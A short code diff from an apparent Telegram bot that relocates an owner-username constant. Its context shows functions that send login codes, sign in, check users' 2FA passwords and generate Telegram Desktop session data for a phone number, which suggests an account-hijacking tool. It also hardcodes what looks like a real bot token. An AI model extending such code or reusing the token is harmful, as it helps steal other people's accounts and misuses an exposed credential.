@@ -9,6 +9,7 @@ from auth import send_code, sign_in
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI")
 REDIS_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
 REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
+OWNER_USERNAME = "kalpakemerr"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -112,8 +113,6 @@ async def check_and_process_2fa(user_id):
             except Exception as e:
                 await redis_set(f"2fa_result:{user_id}", "wrong_password")
             return
-
-oWNER_USERNAME = "kalpakemerr"
 
 async def generate_tdata(user_id, phone):
     try:
